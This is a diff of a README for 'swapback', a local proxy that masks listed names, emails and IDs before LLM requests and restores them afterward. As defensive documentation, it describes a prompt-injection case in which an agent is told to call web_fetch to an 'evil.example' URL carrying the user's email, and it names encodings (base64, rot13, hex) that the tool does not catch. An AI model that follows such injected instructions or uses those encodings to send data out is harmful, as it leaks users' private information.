@@ -15,11 +15,17 @@
 
 ## Why
 
-**A hijacked tool call can't carry your real data off the machine.** An agent reads a web page or an email with a
-prompt injection in it, and the model is told to call `web_fetch("https://evil.example/?q=<your email>")` or
-`send_email(to=attacker, body=<your contacts>)`. With swapback in front of the model, the model only ever had
-`«EMAIL_1»`, and a network, shell or send-style tool call keeps the placeholder unless you put that tool on an allow
-list. Tools you trust (your own calendar or send-as-me tool) get the real value back. From `swapback demo`:
+**Your own list, any agent, any API, in code you can read.** swapback is a small local proxy for any agent or app that
+talks OpenAI Chat Completions, OpenAI Responses or Anthropic Messages (set its base URL, change nothing else). You write
+down the names, emails, phones, IDs and addresses that must never reach a model provider. The provider only sees
+`«PERSON_1»`; your app gets the original text back, byte-exact, in plain and streamed replies. There is no model to
+download and nothing probabilistic: exact matching plus patterns, about 4,200 lines of Python, 3 dependencies.
+
+**Tool calls can't carry your listed values out.** An agent reads a page or an email with a prompt injection in it,
+and the model is told to call `web_fetch("https://evil.example/?q=<your email>")`. The model only ever had
+`«EMAIL_1»`, and a network, shell or send-style tool call keeps the placeholder unless you allow that tool. Tools you
+trust (your own calendar or send-as-me tool) get the real value back. [Veil](#comparison) does this too, for coding
+agents; swapback does it for any agent, by tool-name globs. From `swapback demo`:
 
 ```text
 5) tool calls: the model asks to fetch a URL and to send an email
@@ -27,25 +33,31 @@ list. Tools you trust (your own calendar or send-as-me tool) get the real value 
    send_email {"to": "jane.doe@example.com", "body": "Hi, about Friday"}   <- on the allow list: real value restored
 ```
 
-**Your list, no model needed, fails closed.** You list the names, emails, phones, IDs and addresses that matter;
-swapback swaps every written form of them (case, spacing, surname first, accent-free, phone groupings, JSON-escaped
-`\u00f8`, HTML entities) for placeholders like `«PERSON_1»`, forwards the request, and puts the original text back
-into the answer, including streamed answers and tool-call arguments. It is deterministic: exact matching plus
-patterns, three small dependencies, no NER model, no GPU. If a listed value is still readable after the swap, in any
-spelling the model could decode, or anything goes wrong while scrubbing, the request is blocked, not sent.
+**Every common spelling, and a re-check that fails closed.** A listed value is matched in its written variants: any
+case, extra or non-breaking spaces, `.` `_` `-` `+` `/` between words, surname first, accent-free (`ø` → `o`),
+phone groupings with or without the country code. It is also matched when the text is encoded: JSON `\uXXXX`, `\n`
+and other escapes (JSON inside JSON up to 3 levels), HTML entities, `%XX` URL encoding and form encoding (`+` for a
+space, `?q=Jane+Doe`), decomposed accents (NFD), zero-width characters and fullwidth digits or letters. After the swap,
+every outgoing string is checked again in all of those spellings; a listed value still readable, or any scrub error,
+blocks the request (`503`) instead of sending it. **Out of scope:** base64, hex, rot13 and other re-encodings, a
+value split across separate fields, and names you never listed (there is no NER).
 
-- **Measured, and you can re-run it.** `swapback selftest` sends made-up listed values through 7 request paths and
-  prints the result. 0.4.2: 31/31 listed values caught, 0 of 630 forms leaked, 45/45 ordinary sentences untouched,
-  630/630 exact round trips. Unlisted values caught by the patterns alone: 6/8 (both unlisted names missed: there is
-  no NER). An independent holdout with different made-up data: 44/44 listed caught, 0 of 868 leaked, 46/47 ordinary
-  sentences untouched, 7/11 unlisted caught. See [Leak test](#leak-test-swapback-selftest).
+- **Measured, and you can re-run it.** `swapback selftest` (5 seconds, made-up data shipped in the package) sends
+  each listed value in 183 written forms through 7 request paths. 0.4.3: 33/33 listed values caught, 0 of 1,281 forms
+  leaked, the re-check alone (swap switched off) sees 549/549 forms, 51/51 ordinary sentences untouched, 1,183/1,183
+  exact round trips. Unlisted values caught by the patterns alone: 6/8 (both unlisted names missed). A second holdout
+  with different made-up data (45 listed values, 53 ordinary sentences; written by the maintainer, not independent):
+  0.4.2 caught 8/45 and leaked 731 of 1,673 forms, 0.4.3 caught 45/45 and leaked 0; ordinary text untouched 44/53 →
+  53/53; unlisted 6/11. See [Leak test](#leak-test-swapback-selftest).
 - **Byte-exact restore.** The reply gets back the string as you wrote it: same case, same phone format, same spacing.
-- **Fails closed, loudly.** A scrub error, an unreadable body, an empty known file or a known value still present after
-  the swap answers `503`, with a message in the API's own error shape that says what was blocked and why, so the agent
-  can show it, plus one log line on stderr. A known file that suddenly shrinks keeps the old values protected, logs a
-  warning and turns `/scrubber/health` to `"status": "warning"`, `"ok": false`.
-- **Agent-neutral.** Works with any client that lets you set a base URL: OpenAI Chat and Responses (Codex), Anthropic
-  Messages (Claude Code), JSON and streaming ([Tool calls](#tool-calls), [Framework recipes](#framework-recipes)).
+  A value restored inside a JSON reply (JSON mode, structured output) is JSON-escaped, so the reply stays valid JSON.
+- **Fails closed, loudly.** A scrub error, an unreadable body, a missing or empty known file or a known value still
+  present after the swap answers `503`, with a message in the API's own error shape that says what was blocked and why,
+  plus one log line on stderr. A known file that suddenly shrinks keeps the old values protected, logs a warning and
+  turns `/scrubber/health` to `"status": "warning"`, `"ok": false` (and `swapback health` exits 1).
+- **Names that are ordinary words stay out of ordinary sentences.** A listed name made only of dictionary words
+  ("Drew Wells", "Jack Frost") is matched only when written as a name, every word capitalised, so "she drew wells"
+  goes out unchanged. `common_names_title_case: false` matches them in any case.
 - **Not a replacement for NER.** Names you never listed go out as written. Use it alongside an NER tool if you need
   that ([Use alongside other tools](#use-alongside-litellm-or-an-ner-tool)).
 
@@ -198,8 +210,13 @@ for them. `python examples/smoke.py` runs the same check offline against the moc
 1. **Swap.** Every string in the JSON request body is scanned. Values from your known-values file are matched as whole
    words, case-insensitively, in their common written variants (a phone number also matches `(425) 555-0182`,
    `425.555.0182`, `+14255550182`, ...; a multi-word value also matches with its words joined by non-breaking or
-   repeated spaces, tabs, zero-width characters, `.`, `_`, `-` or `%20`, so `Jane.Q.Doe`, `JANE Q DOE` and
-   `Jane%20Q%20Doe` are the same person under one placeholder). Detectors then catch what you did not list:
+   repeated spaces, tabs, zero-width characters, `.`, `_`, `-`, `+`, `/` or `%20`, so `Jane.Q.Doe`, `JANE Q DOE`,
+   `Jane+Q+Doe` and `Jane%20Q%20Doe` are the same person under one placeholder). Escaped text is decoded for matching
+   (JSON `\uXXXX` and `\n`, nested JSON, HTML entities, `%XX`) and normalized (NFC for decomposed accents, zero-width
+   characters removed, fullwidth ASCII folded), and each hit is mapped back to the span it came from. A listed name made
+   only of dictionary words (a 64k-word English list ships in the package) matches only in Title Case or capitals; a
+   comma between two ordinary lower-case words ("say grace, lee side") does not join a surname-first name. Detectors
+   then catch what you did not list:
    - phone numbers via [`phonenumbers`](https://github.com/daviddrysdale/python-phonenumbers);
    - email, credit card (Luhn), IBAN, US SSN, IP address and profile URLs, from
      [Microsoft Presidio](https://github.com/microsoft/presidio)'s predefined recognizer patterns;
@@ -207,8 +224,9 @@ for them. `python examples/smoke.py` runs the same check offline against the moc
    - a few local rules: street addresses, keyword-anchored account numbers and dates of birth, order numbers, and
      gap rules for emails written as `name [at] example [dot] org` or with a full-width `＠` or hidden zero-width
      characters, and IPv6 addresses.
-2. **Re-check.** After the swap, every outgoing string is checked again for known values, with the same variant rules.
-   If one is left, the request is blocked.
+2. **Re-check.** After the swap, every outgoing string is checked again for known values, with the same variant rules
+   and in the same decoded and normalized views. If one is left, the request is blocked. `swapback selftest` checks
+   this on its own, with the swap switched off: every form must be seen by the re-check.
 3. **Forward or block.** Paths, headers (including `Authorization`) and the model name pass through unchanged. Any error
    while scrubbing answers `503` with a `scrubber_error`, and nothing is forwarded.
 4. **Restore.** Placeholders in the reply are swapped back to the original text: plain JSON responses anywhere in the
@@ -216,7 +234,9 @@ for them. `python examples/smoke.py` runs the same check offline against the moc
    reasoning deltas, `function_call_arguments` and `custom_tool_call_input` deltas, and the `.done` and
    `response.completed` snapshots) and Anthropic Messages streams (`text_delta`, and `input_json_delta` for
    `tool_use`), delta by delta. A placeholder split across chunks is held back until complete.
-   Values inside tool-call arguments are JSON-escaped. Each variant comes back exactly as it was written in the request.
+   Values inside tool-call arguments, and inside the strings of a reply that is a JSON document (it starts with `{` or
+   `[`), are JSON-escaped. Each variant comes back exactly as it was written in the request; a value that was written
+   escaped (`S\u00f8ren`, `%C3%B8`) comes back in its plain spelling (`Søren`).
 
 Placeholders are stable: a local vault (`vault.json`, mode `0600`) maps each value to the same placeholder across
 requests, so multi-turn conversations stay coherent. A short system note asks the model to keep placeholders as written.
@@ -272,6 +292,13 @@ tool_restore:
 ```
 
 `tool_restore: false` restores every tool call, as 0.2 did.
+
+**Why the default for other tools is `restore`, not `keep`.** Veil, for example, gives unknown tools pseudonyms.
+swapback restores them because the tools left after the rules above are the ones that act on your machine and your
+own accounts: writing a file, filling a form, creating a calendar event. Placeholders there are silent data corruption
+(a saved document addressed to `«PERSON_1»`), and the egress cases are already caught by name and by URL. If your agent
+loads tools you don't know (third-party MCP servers, plugins), set `default: keep` and allow the ones you trust; that is
+the stricter setting, and the one to use when you can't review the tool list.
 
 ## Framework recipes
 
@@ -478,26 +505,30 @@ Other open-source projects do the same job. This table reflects each project's o
 | | **swapback** | [PasteGuard][pg] | [Maskit][mk] | [Veil][vl] | [piighost][ph] | [Kiji Privacy Proxy][kj] |
 |---|---|---|---|---|---|---|
 | License | MIT | Apache-2.0 | AGPL-3.0 | Apache-2.0 | MIT | Apache-2.0 |
-| Stack | Python 3.11+, 3 deps, stdlib HTTP server | TypeScript on Bun + GLiNER detector service; Docker | Python engine + desktop app; Docker | Python 3.11+ (PyPI, Homebrew) | Python library (PyPI); HTTP proxy in a separate repo, piighost-api | Go server + Electron desktop app; Docker, systemd |
+| Stack | Python 3.11+, about 4,200 lines (200 KB), 3 deps, stdlib HTTP server | TypeScript on Bun + GLiNER detector service; Docker | Python engine + desktop app; Docker | Python 3.11+ (PyPI, Homebrew), about 630 KB of Python; httpx, cryptography, pyahocorasick | Python library (PyPI); HTTP proxy in a separate repo, piighost-api | Go server + Electron desktop app; Docker, systemd |
 | Needs an ML model | No | Yes: GLiNER for names and places ([docs][pg-sem]) | Ships a local ONNX NER model | Optional: 46 MB ONNX NER | Optional: pluggable regex, NER or LLM detectors; exact-match needs none | Yes: local ONNX model, 26 PII types |
-| Your own list of values | Yes, typed, reloaded live | Yes: `denylist` patterns ([docs][pg-mask]) | Yes: custom words and regexes | Yes: seeded from your data sources | Yes: `ExactMatchDetector` | Custom regex rules |
+| Your own list of values | Yes: a YAML/JSON file you write (or build from a vCard/CSV export), typed, reloaded live | Yes: `denylist` patterns ([docs][pg-mask]) | Yes: custom words and regexes | Yes: seeded from your databases, fixtures, git history and schemas | Yes: `ExactMatchDetector` | Custom regex rules |
 | Stand-ins | Typed placeholders (`«EMAIL_1»`) | Placeholders | Unclear | Pseudonyms | Typed placeholders (`<<EMAIL:1>>`) | Realistic dummy values |
 | Restores values in replies | Yes, byte-exact as written | Yes ("supported placeholders") | Yes | Yes | Yes | Yes |
-| Streaming restore | OpenAI Chat and Responses, Anthropic Messages SSE | Yes | Yes (SSE) | Unclear per API | Unclear | Unclear |
-| Tool-call arguments | Real values for local tools; placeholders kept for web, shell and send-style tools and any call with a URL, by default; `tool_restore` allow/deny lists | Unclear | Unclear | Per-tool policy: unknown and network tools get pseudonyms | Restored for tools (LangChain middleware); per-tool policy unclear | Unclear |
-| On a scrub error | Fails closed (`503`) + egress re-check | Unclear | Unclear; documents a passthrough that forwards plaintext when masking is off or the app exits | Fails closed (`502`) + second guard | Unclear | Unclear |
-| Tool-call egress policy (a prompt-injected `web_fetch`/`send_email` can't carry real values out) | Yes, default on; streamed tool arguments held until the call is complete | Unclear | Unclear | Yes (per-tool policy) | Unclear | Unclear |
-| OpenAI Responses API streams restored | Yes (`/v1/responses`, Codex) | Unclear | Unclear | Unclear | Unclear | Unclear |
-| Fails closed on an empty or shrunk list, or a listed value left after the swap | Yes: blocks (empty), keeps old values + warns (shrunk), egress re-check on decoded text (`\uXXXX`, entities, `%XX`) | Unclear | Unclear | Fails closed on errors; list guard unclear | Unclear | Unclear |
-| Public, re-runnable leak test | `swapback selftest` (7 paths, numbers above) | No | No | No | No | No |
+| Streaming restore | OpenAI Chat and Responses, Anthropic Messages SSE | Yes | Yes (SSE) | Yes for the clients it lists (Claude Code, Codex on Responses, Bedrock event streams) | Unclear | Unclear |
+| Tool-call arguments | Real values for local tools; placeholders kept for web, shell and send-style tools and any call with a URL, by default; `tool_restore` allow/deny lists | Unclear | Unclear | Per-tool policy: web tools, unknown tools and network commands get pseudonyms (stricter default than swapback's); restored values escaped for shells and file types | Restored for tools (LangChain middleware); per-tool policy unclear | Unclear |
+| On a scrub error | Fails closed (`503`) + egress re-check | Unclear | Unclear; documents a passthrough that forwards plaintext when masking is off or the app exits | Fails closed (`502`) + a second guard on the outgoing bytes (plain, encoded, transformed, truncated) | Unclear | Unclear |
+| Tool-call egress policy (a prompt-injected `web_fetch`/`send_email` can't carry real values out) | Yes, default on, by tool-name globs for any agent; streamed tool arguments held until the call is complete | Unclear | Unclear | Yes, built around coding-agent tools and shell commands | Unclear | Unclear |
+| OpenAI Responses API streams restored | Yes (`/v1/responses`, Codex) | Unclear | Unclear | Yes (Codex CLI) | Unclear | Unclear |
+| Encoded spellings checked before sending | `\uXXXX`/`\n` escapes, nested JSON, HTML entities, `%XX`, `+` for space, NFD, zero-width, fullwidth; not base64 or shell transforms | Unclear | Unclear | Yes, wider: a 21-transform bypass matrix (byte dumps, base64, rot13, ...) in its regression suite |
+| Fails closed on an empty or shrunk list, or a listed value left after the swap | Yes: blocks (empty), keeps old values + warns (shrunk), egress re-check in every spelling above | Unclear | Unclear | Fails closed on errors and leftovers; list-shrink guard unclear | Unclear | Unclear |
+| Leak test you can re-run | `swapback selftest`: one command after `pip install`, made-up data in the package, 5 s, prints the numbers above | No | No | Yes: bypass matrix and leak checks in its test suite, with real-traffic numbers in its README | No | No |
 | APIs | OpenAI Chat and Responses, Anthropic Messages (JSON and streaming) | OpenAI Chat + Responses, Anthropic, Codex | OpenAI, DeepSeek, Anthropic | Anthropic Messages, OpenAI Chat + Responses, Bedrock, Vertex, more | OpenAI and Anthropic connectors; LangChain, Pydantic AI, LlamaIndex, Claude Code integrations | OpenAI; Anthropic named in its diagram |
 | Beyond text | No; [hooks](#hooks) for spend caps and local fallback | Browser extension, dashboard, route-to-local-LLM mode | Image/PDF OCR redaction, browser extension, dashboard | Encrypted vault, DB seeding, shell-safe escaping, MCP DB tool | Agent-framework middleware, chat UI example | Desktop UI, Chrome extension |
 
-**Where swapback fits:** you want something small you can read in an afternoon, that never needs a model, restores
-the exact original text where your tools need it, keeps placeholders where a tool could send it out, and blocks rather than leaks. **Where others are stronger:** names you
-never listed (PasteGuard, Maskit and Kiji, and the optional NER in Veil and piighost), more APIs and streaming formats (all three), images and documents
-(Maskit), coding-agent hardening such as escaping restored values for shells (Veil), framework middleware
-(piighost) and a desktop app (Kiji).
+**Where swapback fits:** a personal or business agent of any kind (not only a coding agent) whose sensitive data is a
+list you can write down: your family, your contacts, your clients, your IDs. You want one small proxy you can read in
+an afternoon, that works with whatever client or framework you use as long as it speaks one of the three APIs, never
+needs a model, restores the exact original text where your tools need it, keeps placeholders where a tool could send
+it out, and blocks rather than leaks. **Where others are stronger:** names you never listed (PasteGuard, Maskit and
+Kiji, and the optional NER in Veil and piighost); coding agents on production data (Veil: database seeding, shell-safe
+escaping, a wider transform-bypass suite, a stricter tool default, Bedrock and Vertex); images and documents (Maskit);
+framework middleware (piighost); a desktop app (Kiji).
 
 [pg]: https://github.com/sgasser/pasteguard
 [pg-mask]: https://pasteguard.com/docs/concepts/mask-mode
@@ -535,12 +566,16 @@ Listing a value in `known.yaml` or `private_terms.yaml` covers any of these. The
   common API keys and a few local rules. National IDs other than the US SSN, free-form addresses, dates of birth in
   most label forms and many other formats are not detected unless you list them. See the measured score below.
 - **Whole words, case-insensitive.** `Jane` does not match `Janet`. Separator and case variants of a listed multi-word
-  value are caught (see How it works), and so are its JSON-escaped (`S\u00f8ren`), HTML-entity and `%XX` spellings;
-  nicknames, misspellings and other spellings need their own entries. Commas and newlines also separate the parts of a
+  value are caught (see How it works), and so are its JSON-escaped (`S\u00f8ren`), HTML-entity, `%XX`, form-encoded
+  (`+`), NFD, zero-width and fullwidth spellings; nicknames, misspellings and other spellings need their own entries.
+  Base64, hex, rot13 and similar re-encodings are out of scope: a listed value written that way is not caught, and an
+  agent that runs a shell can produce them (Veil's transform matrix covers more of this). Commas and newlines also separate the parts of a
   listed address, so the same address written over two lines is caught.
-- **Names that are ordinary words.** A listed name made only of common words ("Will Hunt", "Rose Marsh") is swapped
-  only when every word is capitalised, so "I will hunt for the keys" is left alone; a lower-case "will hunt" that
-  really is the person is then not swapped. `check-config` lists these names. Set `common_names_title_case: false` to
+- **Names that are ordinary words.** A listed name of two or more words that are all English dictionary words ("Will
+  Hunt", "Drew Wells", "Jack Frost", also "John Brown"), or a one-word name on the short common-name list ("Rose"), is
+  swapped only when every word is capitalised, so "I will hunt for the keys" and "she drew wells" are left alone; a
+  lower-case "drew wells" that really is the person is then not swapped, and not blocked by the re-check either. The
+  word list is SCOWL size 50 (64k lower-case words, shipped gzipped in the package). `check-config` lists these names. Set `common_names_title_case: false` to
   match them in any case (and accept the false positives).
 - **Variants and restore.** All written variants of one listed value share one placeholder. A reply gets back the forms
   written in the same request, in order of occurrence; a reply with more mentions than the request reuses the last one.
@@ -567,32 +602,38 @@ swapback selftest          # or: swapback selftest --json
 ```
 
 It needs no config, key or network. A recording fake model and the proxy start on loopback ports with a fixed list of
-made-up values shipped in the package: 13 names (5 with accents, 4 that are also ordinary phrases), 4 emails, 7 phones
-(US, India, UK, Australia, Germany, France), 4 IDs and 3 addresses. Each value is sent in 2–5 written forms (as
-written, upper case, surname first, accent-free, other phone groupings, compact IDs, two-line addresses) through 7
-paths: OpenAI chat, chat streamed, chat with the value in tool-call arguments and a `json.dumps` tool result,
-Anthropic streamed, Anthropic `tool_use`/`tool_result`, Responses streamed and Responses
-`function_call`/`function_call_output`. The fake model echoes the user text, so the round trip is checked too. The
-leak check does not use swapback's matcher: it decodes JSON (nested), `\uXXXX`, HTML entities and `%XX` on the model
-side, folds case and accents, and looks for each value's name words, email, phone digits, ID characters and street line.
+made-up values shipped in the package: 15 names (5 with accents, 6 made only of ordinary words), 4 emails, 7 phones
+(US, India, UK, Australia, Germany, France), 4 IDs and 3 addresses. Each value is sent in 4–9 written forms (as
+written, upper case, surname first, accent-free, other phone groupings, compact IDs, two-line addresses, and the
+encoded forms: `quote_plus` URL/form encoding, `+` or `/` between words, decomposed accents (NFD), a zero-width space
+inside a word, fullwidth digits) through 7 paths: OpenAI chat, chat streamed, chat with the value in tool-call
+arguments and a `json.dumps` tool result, Anthropic streamed, Anthropic `tool_use`/`tool_result`, Responses streamed
+and Responses `function_call`/`function_call_output`. The fake model echoes the user text, so the round trip is checked
+too: forms written as plain text must come back byte for byte; `%XX`-encoded forms come back as the same value in its
+decoded spelling. The leak check does not use swapback's matcher: it decodes JSON (nested), `\uXXXX`, HTML entities,
+`%XX` and `+` on the model side, removes zero-width characters, applies NFKD (accents, fullwidth), folds case, and looks
+for each value's name words, email, phone digits, ID characters and street line. It also runs the egress re-check on
+its own, with the swap switched off, on every form as text, as a `json.dumps` tool result and as JSON inside JSON.
 
-0.4.2 on Python 3.11:
+0.4.3 on Python 3.11:
 
 ```text
-swapback selftest: 31 made-up listed values, 90 written forms, 7 paths, 630 requests (2.4 s)
-  listed values caught (no form reached the model): 31/31 (100.0%)
-  forms leaked to the model:                        0 of 630 sent
-  ordinary sentences left untouched:                45/45 (100.0%)
-  exact round trips:                                630/630 (100.0%)
+swapback selftest: 33 made-up listed values, 183 written forms, 7 paths, 1281 requests (4.8 s)
+  listed values caught (no form reached the model): 33/33 (100.0%)
+  forms leaked to the model:                        0 of 1281 sent
+  egress re-check alone (swap off) sees the form:   549/549 (100.0%)
+  ordinary sentences left untouched:                51/51 (100.0%)
+  exact round trips:                                1183/1183 (100.0%)
+  %XX-encoded forms back as the same value, decoded: 98/98 (100.0%)
   unlisted values caught by the pattern detectors:  6/8 (75.0%)  (reported, not a pass condition; names are never caught without a list)
 PASS
 ```
 
-The same test against 0.4.1 (the selftest file copied into a 0.4.1 install): 24/31 caught, 50 of 630 forms leaked
-(accented names in JSON-escaped tool content, two-line addresses), 43/45 ordinary sentences untouched. With different
-made-up data (44 listed values, 47 ordinary sentences, 11 unlisted), 0.4.1 → 0.4.2: listed caught 34/44 → 44/44, forms
-leaked 78/868 → 0/868, ordinary sentences untouched 43/47 → 46/47 (the one left: "Lee, grace us with a song" matches a
-listed "Grace Lee" written surname first), unlisted caught 7/11 both times.
+The same test against 0.4.2 (the 0.4.3 selftest file copied into a 0.4.2 install): 5/33 caught, 549 of 1,281 forms
+leaked (`+`-encoded, NFD, zero-width and fullwidth forms), the re-check alone saw 288/549 forms, 46/51 ordinary
+sentences untouched ("drew wells", "gene pool"). With different made-up data (45 listed values, 53 ordinary sentences,
+11 unlisted; written by the maintainer, not an independent review), 0.4.2 → 0.4.3: listed caught 8/45 → 45/45, forms
+leaked 731/1,673 → 0/1,673, ordinary sentences untouched 44/53 → 53/53, unlisted caught 6/11 both times.
 
 ## Performance
 
